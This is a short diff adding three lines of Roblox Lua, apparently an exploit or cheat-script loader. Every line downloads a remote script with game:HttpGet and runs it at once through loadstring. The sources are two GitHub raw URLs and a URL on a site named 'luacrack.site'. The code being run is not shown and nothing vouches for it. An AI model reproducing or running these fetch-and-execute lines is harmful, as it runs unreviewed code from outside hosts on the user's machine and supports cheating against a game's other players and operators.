@@ -1,0 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/noguchihyuga/idk/refs/heads/main/abcyxz.lua"))()
+
+loadstring(game:HttpGet("https://github.com/TlDinhKhoi/Util/raw/refs/heads/main/NotifyBloxKid.luau"))()
+
+loadstring(game:HttpGet("https://luacrack.site/index.php/concacmaydaitoinach/raw/Notify"))()
